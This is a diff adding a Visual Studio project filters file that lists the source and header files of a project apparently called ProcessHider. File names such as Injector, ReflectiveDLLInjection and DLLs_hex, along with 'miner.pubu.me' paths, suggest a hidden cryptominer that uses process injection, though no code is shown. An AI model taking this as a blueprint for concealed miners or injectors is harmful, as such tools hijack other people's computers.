@@ -1,0 +1,227 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Daemon.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="HiderMain.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="XGetopt.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="linkedList.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Injector.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Preparations.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="GetProcAddressR.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="LoadLibraryR.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\Common\DLLs_hex.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_Shared.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_Stub.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_Unix.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_Win32.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_WinRT.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\md5.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_active.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_conf.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_global.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_guard.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_main.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_pc.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\aes256cbc\aes256cbc.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\aes256cbc\base64.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\c_tool.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Daemon.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="XGetopt.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="linkedList.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Injector.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Preparations.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="resource.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="GetProcAddressR.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="LoadLibraryR.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ReflectiveDLLInjection.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\Common\ArgumentsPassing.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="defs.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\Common\DLLs_hex.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\detail\cpuid.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\detail\memory.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\detail\pci.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\detail\scope.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\cpu.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\gpu.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\infoware.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\system.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\NetAdapter\NetAdapter_Internal.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\client_http.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\client_https.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\crypto.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\server_http.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\server_https.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\status_code.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\SimpleWebServer\utility.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\config.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\json.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\md5.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\c_tool.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_active.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_conf.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_global.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_guard.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_main.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\i_pc.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\aes256cbc\aes256cbc.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\aes256cbc\base64.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="ProcessHider.rc">
+      <Filter>Resource Files</Filter>
+    </ResourceCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="..\BuildOutput\x64Hider.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="..\..\..\..\..\%40git\miner.pubu.me\pc\ProcessHider\ProcessHider\O\lib\infoware\infoware.lib" />
+  </ItemGroup>
+</Project>
